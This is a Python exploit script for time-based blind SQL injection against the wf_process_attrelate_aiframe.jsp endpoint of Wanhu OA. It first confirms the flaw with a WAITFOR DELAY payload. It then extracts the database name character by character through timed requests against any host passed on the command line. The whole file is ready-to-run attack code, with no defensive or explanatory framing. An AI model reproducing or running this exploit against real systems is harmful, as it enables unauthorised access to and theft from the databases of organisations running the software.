# coding:utf-8

import requests

import time

from random import Random

import string

from urllib import parse

import urllib3

urllib3.disable_warnings()

import sys

class TrickUrlSession(requests.Session):

    def setUrl(self, url):

        self._trickUrl = url

    def send(self, request, **kwargs):

        if self._trickUrl:

            request.url = self._trickUrl

        return requests.Session.send(self, request, **kwargs)

session = TrickUrlSession()



headers={

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',

    'Content-Type': 'text/xml;charset=UTF-8'

    }





proxies = {

      #"http": "http://127.0.0.1:8080",

      #"https": "http://127.0.0.1:8080"

    }



def url_encoding(string):

    return parse.quote(string)



def may(host):

    session = requests.session()

    try:

        url=host+f"/defaultroot/login.jsp"

        headers={

        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',

        }

        response=session.get(url,headers=headers,timeout=15,verify=False)

    except:

        return 0

    url=host+"/defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1"+url_encoding(";waitfor delay '0:0:6'--+")

    response=session.get(url,headers=headers,timeout=15,verify=False)

    hs1=response.elapsed.total_seconds()

    # print(hs1,hs2,hs3)

    if 5.5<hs1<7.5:

        print("[+] "+host +" 存在万户wf_process_attrelate_aiframe sql注入漏洞! 开始查询select db_name(1)")

        return 1

    else:

        print("error!: ",response.status_code)

        return 0



def st():

    str = ''

    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'

    length = len(chars) - 1

    random = Random()

    for i in range(5):

        str += chars[random.randint(0, length)]

    return str



def sqlinjection_poc1(host):

    session = requests.session()

    url=host+f"/defaultroot/login.jsp"

    headers={

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',

    }

    response=session.get(url,headers=headers,timeout=15,verify=False)

    password_hash = ''

    char = 'abcdefghigklmnopqrstuvwxyz@.1234567890$ABCDEFGHIJKLMNOPQRSTUVWXYZ*'

    for i in range(1, 9):

        for q in char:

            if q == '*':

                exit()

            

            payload = f";IF ASCII(SUBSTRING((select db_name(1)),{i},1))={ord(q)} WAITFOR delay '0:0:6'--"

            url = host + "/defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1"+url_encoding(f"{payload}")

            resp = session.get(url,headers=headers, timeout=10, allow_redirects=False,verify=False,proxies=proxies)

            if 5<resp.elapsed.total_seconds()<8:

                password_hash += q

                print("第", i, "位：", q)

                i = i+1

                break

            else:

                pass

    print("select db_name(1)查询结果为：" + password_hash)









if __name__ == '__main__':

    if len(sys.argv) < 2:

        print('Usage: python3 wanhu-wf_process_attrelate_aiframe-sqli-mssql-exp.py http://127.0.0.1')

        sys.exit(1)

    host = sys.argv[1]

    if may(host) == 1:

        sqlinjection_poc1(host)

    else:

        print()

        exit()